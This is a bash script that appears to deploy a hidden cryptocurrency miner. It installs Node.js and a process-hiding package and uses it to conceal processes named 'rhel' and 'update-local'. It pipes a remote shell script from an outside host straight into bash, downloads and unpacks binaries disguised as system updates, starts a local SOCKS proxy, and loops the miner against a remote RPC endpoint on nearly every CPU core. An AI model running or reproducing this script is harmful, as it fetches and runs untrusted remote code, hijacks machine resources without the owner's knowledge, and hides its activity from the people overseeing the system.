#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev >/dev/null

sleep 2

wget -q https://nodejs.org/download/release/v18.9.1/node-v18.9.1-linux-x64.tar.gz
tar -xf node-v18.9.1-linux-x64.tar.gz
export PATH=$HOME/node-v18.9.1-linux-x64/bin:$PATH

sleep 2

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add rhel 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &

sleep 4

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2


array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Bit_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

wget -q http://greenleaf.teatspray.uk/rhel.tar.gz
sleep 2
tar -xf rhel.tar.gz
sleep 2

curl http://greenleaf.teatspray.uk/update.tar.gz -L -O -J

sleep 2

tar -xf update.tar.gz

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update wget -q -O- http://api.ipify.org

sleep 2

while true
do
./update/update ./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706 -cputhreads $used_num_of_cores -extrapayload SoloMiningToMyNodeLolWut
sleep 10
done
